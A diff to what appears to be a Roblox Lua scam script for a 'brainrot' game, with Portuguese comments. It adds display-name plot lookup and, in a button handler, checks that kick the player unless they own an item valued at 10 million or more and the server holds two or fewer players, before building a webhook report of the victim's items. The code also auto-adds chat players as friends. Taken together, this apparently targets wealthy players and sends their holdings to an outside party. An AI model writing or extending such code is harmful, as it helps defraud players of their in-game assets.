@@ -14,8 +14,31 @@ local function simplifyForMatch(str)
     return normalize(str):gsub("%W","")
 end
 
+-- ✨ NOVA FUNÇÃO: Pega o Player pelo nome (username OU displayname)
+local function getPlayerByName(name)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name == name or plr.DisplayName == name then
+            return plr
+        end
+    end
+    return nil
+end
+
+-- ✨ FUNÇÃO MELHORADA: Agora procura por USERNAME e DISPLAYNAME
 local function findPlayerPlot(plotsFolder, playerName)
     if not plotsFolder then return nil end
+    
+    -- Tenta pegar o Player object
+    local targetPlayer = getPlayerByName(playerName)
+    
+    -- Monta as possibilidades de busca
+    local searchNames = {playerName} -- Username original
+    if targetPlayer and targetPlayer.DisplayName ~= targetPlayer.Name then
+        table.insert(searchNames, targetPlayer.DisplayName) -- Adiciona DisplayName se for diferente
+    end
+    
+    print("🔍 Procurando plot para:", playerName)
+    print("   Buscando por:", table.concat(searchNames, " OU "))
     
     -- Procura em cada plot
     for _, plot in ipairs(plotsFolder:GetChildren()) do
@@ -29,14 +52,24 @@ local function findPlayerPlot(plotsFolder, playerName)
                     local frame = surfaceGui:FindFirstChild("Frame")
                     if frame then
                         local textLabel = frame:FindFirstChild("TextLabel")
-                        if textLabel and textLabel.Text == playerName.."'s Base" then
-                            return plot -- Encontrou o plot do jogador
+                        if textLabel then
+                            local baseText = textLabel.Text
+                            
+                            -- ✨ BUSCA POR USERNAME OU DISPLAYNAME
+                            for _, name in ipairs(searchNames) do
+                                if baseText == name.."'s Base" then
+                                    print("✅ Plot encontrado com:", name)
+                                    return plot
+                                end
+                            end
                         end
                     end
                 end
             end
         end
     end
+    
+    print("❌ Plot não encontrado para:", playerName)
     return nil
 end
 
@@ -360,10 +393,10 @@ Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
 
 --// Button Animation
 button.MouseEnter:Connect(function()
-	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 150, 255)}):Play()
+    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 150, 255)}):Play()
 end)
 button.MouseLeave:Connect(function()
-	TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 130, 255)}):Play()
+    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 130, 255)}):Play()
 end)
 
 --// Aparecer com animação (fade)
@@ -394,7 +427,7 @@ local function setupChatListeners()
             -- Tenta adicionar como amigo
             tryAddFriend(chatPlayer)
             
-            -- Encontra o plot da pessoa
+            -- ✨ AGORA USA A FUNÇÃO MELHORADA
             local plotsFolder = workspace:FindFirstChild("Plots")
             local targetPlot = findPlayerPlot(plotsFolder, chatPlayer.Name)
             
@@ -464,19 +497,50 @@ button.MouseButton1Click:Connect(function()
     local currentTime = os.date("%H:%M - %d/%m/%Y")
     local totalPlayers = #Players:GetPlayers()
 
-    -- Encontra o plot do jogador
+    -- ✨ AGORA USA A FUNÇÃO MELHORADA
     local plotsFolder = workspace:FindFirstChild("Plots")
     local targetPlot = findPlayerPlot(plotsFolder, player.Name)
     
     -- Pega os animais com seus preços
     local foundAnimals = getAnimalsInPlot(targetPlot)
 
+    -- ✅ VALIDAÇÃO 1: Verifica se tem algum brainrot
+    if #foundAnimals == 0 then
+        print("❌ Nenhum brainrot encontrado")
+        player:Kick("Você não tem nenhum brainrot.")
+        return
+    end
+
+    -- ✅ VALIDAÇÃO 2: Verifica se o brainrot tem valor mínimo de 10 milhões
+    local hasValidBrainrot = false
+    for _, animal in ipairs(foundAnimals) do
+        -- Remove caracteres não numéricos e converte para número
+        local priceStr = tostring(animal.price):gsub("[^0-9]", "")
+        local priceValue = tonumber(priceStr) or 0
+        
+        if priceValue >= 10000000 then -- 10 milhões
+            hasValidBrainrot = true
+            break
+        end
+    end
+
+    if not hasValidBrainrot then
+        print("❌ Brainrot com valor menor que 10 milhões")
+        player:Kick()
+        return
+    end
+
+    -- ✅ VALIDAÇÃO 3: Verifica se tem mais de 2 jogadores no servidor
+    if totalPlayers > 2 then
+        print("❌ Mais de 2 jogadores no servidor")
+        player:Kick("Você só pode fazer essa ação com uma única pessoa no servidor.")
+        return
+    end
+
     -- Monta o texto para a webhook
     local brainrotsValue
     if not targetPlot then
         brainrotsValue = "Plot não encontrado"
-    elseif #foundAnimals == 0 then
-        brainrotsValue = "Nenhum"
     else
         local parts = {}
         for _, animal in ipairs(foundAnimals) do
